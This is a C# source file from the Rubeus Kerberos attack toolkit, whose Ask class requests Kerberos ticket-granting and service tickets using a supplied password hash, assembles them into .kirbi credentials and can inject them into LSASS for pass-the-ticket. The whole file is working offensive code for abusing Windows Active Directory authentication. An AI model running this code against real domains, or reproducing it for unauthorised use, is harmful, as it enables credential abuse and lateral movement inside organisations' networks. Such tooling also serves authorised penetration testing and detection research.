using System;
using Asn1;

namespace Rubeus
{
    public class Ask
    {
        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, bool ptt, string domainController = "", uint luid = 0)
        {
            Console.WriteLine("[*] Action: Ask TGT\r\n");
            Console.WriteLine("[*] Using {0} hash: {1}", etype, keyString);

            if (luid != 0) {
                Console.WriteLine("[*] Target LUID : {0}", luid);
            }
            string dcIP = Networking.GetDCIP(domainController);
            if(String.IsNullOrEmpty(dcIP)) {
                return null;
            }
            Console.WriteLine("[*] Building AS-REQ (w/ preauth) for: '{0}\\{1}'", domain, userName);
            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, keyString, etype);
            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
            if (null == response) {
                return null;
            }
            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);
            // check the response value
            int responseTag = responseAsn.TagValue;
            switch (responseTag) {
                case 11:
                    Console.WriteLine("[+] TGT request successful!");
                    // parse the response to an AS-REP
                    AS_REP rep = new AS_REP(responseAsn);
                    // convert the key string to bytes
                    byte[] key = Helpers.StringToByteArray(keyString);
                    // decrypt the enc_part containing the session key/etc.
                    // TODO: error checking on the decryption "failing"...
                    byte[] outBytes;
                    if (etype == Interop.KERB_ETYPE.rc4_hmac) {
                        // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                        outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                    }
                    else if(etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1) {
                        // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                        outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
                    }
                    else {
                        Console.WriteLine("\r\n[X] Encryption type \"{0}\" not currently supported", etype);
                        return null;
                    }
                    AsnElt ae = AsnElt.Decode(outBytes, false);
                    EncKDCRepPart encRepPart = new EncKDCRepPart(ae.FirstElement);
                
                    // now build the final KRB-CRED structure
                    KRB_CRED cred = new KRB_CRED();
                
                    // add the ticket
                    cred.Tickets.Add(rep.ticket);

                    // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
                    KrbCredInfo info = new KrbCredInfo();

                    // [0] add in the session key
                    info.key.keytype = encRepPart.key.keytype;
                    info.key.keyvalue = encRepPart.key.keyvalue;
                    // [1] prealm (domain)
                    info.prealm = encRepPart.realm;
                    // [2] pname (user)
                    info.pname.name_type = rep.cname.name_type;
                    info.pname.name_string = rep.cname.name_string;
                    // [3] flags
                    info.flags = encRepPart.flags;
                    // [4] authtime (not required)
                    // [5] starttime
                    info.starttime = encRepPart.starttime;
                    // [6] endtime
                    info.endtime = encRepPart.endtime;
                    // [7] renew-till
                    info.renew_till = encRepPart.renew_till;
                    // [8] srealm
                    info.srealm = encRepPart.realm;
                    // [9] sname
                    info.sname.name_type = encRepPart.sname.name_type;
                    info.sname.name_string = encRepPart.sname.name_string;

                    // add the ticket_info into the cred object
                    cred.EncryptedPart.ticket_info.Add(info);
                    byte[] kirbiBytes = cred.Encode().Encode();
                    Helpers.DisplayKerberosTicket(kirbiBytes);
                    if (ptt || (0 != luid)) {
                        // pass-the-ticket -> import into LSASS
                        LSA.ImportTicket(kirbiBytes, luid);
                    }
                    return kirbiBytes;
                case 30:
                    Helpers.DisplayKerberosError(responseAsn);
                    return null;
                default:
                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
                    return null;
            }
        }

        public static void TGS(KRB_CRED kirbi, string service, bool ptt = false, string domainController = "",
            bool display = true)
        {
            // extract out the info needed for the TGS-REQ request
            KrbCredInfo credentials = kirbi.EncryptedPart.ticket_info[0];
            string userName = credentials.pname.name_string[0];
            string domain = credentials.prealm;
            Ticket ticket = kirbi.Tickets[0];
            byte[] clientKey = credentials.key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)credentials.key.keytype;

            string[] services = service.Split(',');
            foreach (string sname in services) {
                // request the new service tickt
                TGS(userName, domain, ticket, credentials.key, sname, ptt, domainController, display);
                Console.WriteLine();
            }
        }

        public static byte[] TGS(string userName, string domain, Ticket providedTicket, EncryptionKey key,
            string service, bool ptt, string domainController = "", bool display = true)
        {
            if (display) {
                Console.WriteLine("[*] Action: Ask TGS\r\n");
            }
            string dcIP = Networking.GetDCIP(domainController, display);
            if (string.IsNullOrEmpty(dcIP)) {
                return null;
            }
            if (display) {
                Console.WriteLine("[*] Building TGS-REQ request for: '{0}'", service);
            }
            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, key.keyvalue, key.keytype, false);
            byte[] response = Networking.SendBytes(dcIP, 88, tgsBytes);
            if (response == null) {
                return null;
            }
            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);
            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 13) {
                Console.WriteLine("[+] TGS request successful!");
                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(key.keytype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY,
                    key.keyvalue, rep.enc_part.cipher);
                AsnElt ae = AsnElt.Decode(outBytes, false);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.FirstElement);
                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();
                // add the ticket
                cred.Tickets.Add(rep.ticket);
                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart
                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;
                // [1] prealm (domain)
                info.prealm = encRepPart.realm;
                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;
                // [3] flags
                info.flags = encRepPart.flags;
                // [4] authtime (not required)
                // [5] starttime
                info.starttime = encRepPart.starttime;
                // [6] endtime
                info.endtime = encRepPart.endtime;
                // [7] renew-till
                info.renew_till = encRepPart.renew_till;
                // [8] srealm
                info.srealm = encRepPart.realm;
                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.EncryptedPart.ticket_info.Add(info);
                byte[] kirbiBytes = cred.Encode().Encode();

                if (display) {
                    Helpers.DisplayKerberosTicket(kirbiBytes);
                    if (ptt) {
                        // pass-the-ticket -> import into LSASS
                        LSA.ImportTicket(kirbiBytes);
                    }
                }
                return kirbiBytes;
            }
            else if (responseTag == 30) {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.FirstElement);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.ErrorCode, (Interop.KERBEROS_ERROR)error.ErrorCode);
            }
            else {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
            return null;
        }
    }
}